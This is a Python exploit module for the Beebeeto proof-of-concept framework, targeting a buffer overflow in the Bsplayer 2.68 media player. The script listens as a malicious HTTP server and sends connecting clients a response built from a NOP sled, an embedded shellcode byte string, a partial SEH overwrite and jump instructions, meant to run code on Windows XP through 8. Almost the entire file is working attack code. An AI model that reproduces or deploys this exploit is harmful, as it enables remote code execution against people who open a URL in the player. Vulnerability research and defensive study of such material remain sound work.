#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import sys
import socket
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0072',
            'name': 'Bsplayer 2.68 Universal HTTP Response Exploit',
            'author': 'fady_osman',
            'create_date': '2015-03-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Bsplayer',
            'vul_version': ['2.68'],
            'type': 'Buffer Overflow',
            'tag': ['Bsplayer漏洞', 'Bsplayer缓冲区溢出漏洞', 'HTTP Response Exploit'],
            'desc': '''
                    Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.
                    In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full
                    address and then used backward jumping to jump to a long jump that eventually land in my shellcode.

                    Tested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)

                    My twitter: @fady_osman
                    My youtube: https://www.youtube.com/user/cutehack3r
                    ''',
            'references': ['http://www.exploit-db.com/exploits/36477/',
            ],
        },
    }

    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-p','--port',
                                    action='store', dest='port', type='string', default=80,
                                    help='about port msg.')


    @classmethod
    def exploit(cls, args):
        s = socket.socket()         # Create a socket object
        url = urlparse.urlparse(args['options']['target']).netloc
        host = socket.gethostbyname(url)   # Ip to listen to.
        port = args['options']['port']     # Reserve a port for your service.
        s.bind((host, port))         # Bind to the port
        if args['options']['verbose']:
            print "[*] Listening on port " + str(port)
        s.listen(10)                 # Now wait for client connection.
        c, addr = s.accept()         # Establish connection with client.
        # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
        if args['options']['verbose']:
            print(('[*] Sending the payload first time', addr))
        c.recv(1024)
        #seh and nseh.
        buf =  ""
        buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
        buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
        buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
        buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
        buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
        buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
        buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
        buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
        buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
        buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
        buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
        buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
        buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
        buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
        buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
        buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
        buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
        buf += "\x8c\xcd\x11\xc2\x37\x12"

        jmplong = "\xe9\x85\xe9\xff\xff"
        nseh = "\xeb\xf9\x90\x90"
        # Partially overwriting the seh record (nulls are ignored).
        seh = "\x3b\x58\x00\x00"
        buflen = len(buf)
        response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
        c.send(response)
        c.close()
        c, addr = s.accept()        # Establish connection with client.
        # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
        if args['options']['verbose']:
            print(('[*] Sending the payload second time', addr))
        c.recv(1024)
        c.send(response)
        c.close()
        s.close()
        args['success'] = True
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())